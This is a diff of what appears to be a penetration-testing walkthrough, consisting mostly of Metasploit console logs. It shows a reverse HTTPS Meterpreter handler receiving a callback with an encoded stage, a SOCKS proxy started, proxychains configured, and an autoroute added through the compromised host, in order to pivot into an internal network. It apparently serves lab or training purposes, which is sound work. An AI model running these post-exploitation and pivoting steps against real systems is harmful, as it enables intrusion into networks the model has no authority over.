@@ -153,13 +153,6 @@ Active sessions
 
 No active sessions.
 
-msf6 exploit(multi/handler) > sessions -i
-
-Active sessions
-===============
-
-No active sessions.
-
 msf6 exploit(multi/handler) >
 [!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Without a database connected that payload UUID tracking will not work!
 [*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Encoded stage with x86/shikata_ga_nai
@@ -199,6 +192,17 @@ Auxiliary action:
    ----   -----------
    Proxy  Run a SOCKS proxy server
 
+
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 3.
+[*] Starting the SOCKS proxy server
+
+------------------------------------------------------------------
+Notes
+# apt-get install proxychains
+# cp /etc/proxychains.conf /etc/proxychains.conf.backup
+# echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
+------------------------------------------------------------------
 
 msf6 auxiliary(server/socks_proxy) > cat /etc/proxychains.conf
 [*] exec: cat /etc/proxychains.conf
@@ -269,16 +273,20 @@ tcp_connect_time_out 8000
 # socks4  127.0.0.1 9050
 socks5  127.0.0.1 1080
 
-msf6 auxiliary(server/socks_proxy) >
 
-msf6 auxiliary(server/socks_proxy) > run autoroute -s 192.168.1.0 -n 255.255.255.0
-[*] Running module against 192.168.1.0
-[*] Running module against 255.255.255.0
-[*] Auxiliary module running as background job 2.
+msf6 auxiliary(server/socks_proxy) > sessions -i 2
+[*] Starting interaction with 2...
 
-[*] Starting the SOCKS proxy server
-[*] Starting the SOCKS proxy server
-[*] Stopping the SOCKS proxy server
+sessio
+meterpreter > run autoroute -s 192.168.1.0 -n 255.255.255.0
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.168.1.0/255.255.255.0...
+[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.113
+[*] Use the -p option to list all active routes
+meterpreter > background
+[*] Backgrounding session 2...
 
 
 msf6 auxiliary(server/socks_proxy) > jobs -l
@@ -288,8 +296,8 @@ Jobs
   Id  Name                           Payload                            Payload opts
   --  ----                           -------                            ------------
   0   Exploit: multi/handler         windows/meterpreter/reverse_https  https://192.168.1.30:443
-  1   Auxiliary: server/socks_proxy
-  
+  3   Auxiliary: server/socks_proxy
+
   
 ============================================================================================================================================
 Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
